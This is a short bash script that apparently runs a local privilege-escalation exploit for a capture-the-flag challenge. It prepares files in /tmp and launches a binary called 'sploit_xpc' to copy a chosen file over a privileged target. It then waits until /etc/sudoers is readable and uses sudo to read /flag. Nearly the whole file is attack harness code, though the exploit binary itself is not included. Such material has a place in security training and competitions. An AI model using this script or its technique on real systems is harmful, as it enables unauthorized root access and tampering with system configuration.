#!/bin/bash

if (( $# < 2 )); then
  echo >&2 "Usage: $0 from to"
  exit 1
fi

for i in `seq 0 300`; do
  echo $i > /tmp/src$i
  rm -f /tmp/dst$i
done

cp "$1" /tmp/src

echo starting
./sploit_xpc -1 /tmp/src "$2" &
PID=$!

echo waiting
while ! cat /etc/sudoers 2>/dev/null 1>&2 ; do
  sleep 1
done

#sudo id
echo
echo
echo
sudo cat /flag
